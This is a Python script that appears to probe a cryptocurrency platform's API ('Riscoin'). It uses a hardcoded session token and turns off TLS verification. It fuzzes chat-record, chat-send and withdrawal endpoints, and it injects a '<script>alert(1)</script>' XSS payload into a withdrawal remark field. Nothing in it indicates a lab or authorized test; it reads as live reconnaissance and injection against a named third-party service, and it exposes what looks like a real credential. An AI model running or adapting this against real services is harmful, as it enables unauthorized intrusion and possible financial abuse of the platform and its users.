"""
Riscoin - Chat XSS Injection + Chat record exploration
"""
import requests, json
import urllib3
urllib3.disable_warnings()

BASE = "https://api.riscoima.com"
TOKEN = "c6apl6v4ok00_1jn74vunp"
H = {
    "Origin": "https://riscoin.com",
    "Referer": "https://riscoin.com/h5/",
    "Content-Type": "application/json",
    "SET-LANGUAGE": "ENGLISH",
    "APP-LOGIN-TOKEN": TOKEN,
    "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36"
}

print("=" * 70)
print("CHAT SYSTEM EXPLORATION")
print("=" * 70)

# First get chat records to understand the expected format
print("\n--- Chat record (with pagination) ---")
for payload in [
    {"pageNum": 0, "pageSize": 20},
    {"pageNum": 1, "pageSize": 20},
    {"page": 1, "size": 20},
    {"recordId": "0"},
    {"id": "0"},
    {"lastId": "0"},
    {"minId": "0"},
]:
    r = requests.post(f"{BASE}/api/app/chat/record", json=payload, headers=H, timeout=10, verify=False)
    j = r.json()
    err = j.get("errCode", "?")
    if err != 100003:
        print(f"  *** HIT: {json.dumps(payload)} -> errCode={err}")
        print(f"     {r.text[:400]}")
    else:
        print(f"  [100003] {json.dumps(payload)}")

# Latest record ID
print("\n--- Latest record ID ---")
for payload in [
    {"recordId": 0},
    {"id": 0},
    {"lastId": 0},
    {"userId": "439441312266874880"},
]:
    r = requests.post(f"{BASE}/api/app/chat/latest/record/id", json=payload, headers=H, timeout=10, verify=False)
    j = r.json()
    err = j.get("errCode", "?")
    if err != 100003:
        print(f"  *** HIT: {json.dumps(payload)} -> errCode={err}")
        print(f"     {r.text[:400]}")
    else:
        print(f"  [100003] {json.dumps(payload)}")

print("\n" + "=" * 70)
print("CHAT SEND - Message Injection")  
print("=" * 70)

# Try sending chat messages with different field combos
send_combos = [
    {"content": "hello test"},
    {"content": "hello test", "type": "text"},
    {"content": "hello test", "type": 1},
    {"content": "hello test", "type": "1"},
    {"msg": "hello test"},
    {"message": "hello test"},
    {"text": "hello test"},
    {"content": "hello", "msgType": "text"},
    {"content": "hello", "sendType": "text"},
    {"content": "hello", "contentType": "text"},
    {"data": "hello test"},
    {"body": "hello test"},
]

for payload in send_combos:
    r = requests.post(f"{BASE}/api/app/chat/send", json=payload, headers=H, timeout=10, verify=False)
    try:
        j = r.json()
        err = j.get("errCode", "?")
        if err == 0:
            print(f"  *** SUCCESS: {json.dumps(payload)}")
            print(f"     {r.text[:400]}")
        elif err != 100003:
            print(f"  DIFFERENT errCode={err}: {json.dumps(payload)} -> {r.text[:200]}")
        else:
            print(f"  [100003] {json.dumps(payload)}")
    except:
        print(f"  [RAW {r.status_code}] {json.dumps(payload)} -> {r.text[:200]}")

print("\n" + "=" * 70)
print("WITHDRAW SUBMIT - XSS in remark")
print("=" * 70)

# Try different field combos for withdrawal
withdraw_combos = [
    # Need to find the right fields first
    {"coinName": "USDT", "amount": "10", "address": "TXtest123", "remark": "test", "chain": "TRC20", "password": "password111"},
    {"coinName": "USDT", "amount": "10", "address": "TXtest123", "remark": "test", "chainType": "TRC20", "tradePwd": "password111"},
    {"currencyId": 1, "amount": "10", "address": "TXtest123", "remark": "test<script>alert(1)</script>"},
    {"symbol": "USDT", "amount": "10", "toAddress": "TXtest123", "remark": "test"},
]

for payload in withdraw_combos:
    r = requests.post(f"{BASE}/api/app/withdraw/submit", json=payload, headers=H, timeout=10, verify=False)
    try:
        j = r.json()
        err = j.get("errCode", "?")
        if err != 100003:
            print(f"  DIFFERENT errCode={err}: {list(payload.keys())} -> {r.text[:200]}")
        else:
            print(f"  [100003] {list(payload.keys())}")
    except:
        print(f"  [RAW {r.status_code}] {list(payload.keys())} -> {r.text[:200]}")

# Check withdrawal payment info to understand the fields
print("\n--- Withdraw payment info ---")
r = requests.post(f"{BASE}/api/app/withdraw/payment", json={}, headers=H, timeout=10, verify=False)
print(f"  {r.text[:500]}")

r = requests.post(f"{BASE}/api/app/withdraw/rec", json={}, headers=H, timeout=10, verify=False)
print(f"\n--- Withdraw rec ---")
print(f"  {r.text[:500]}")

print("\nDone.")
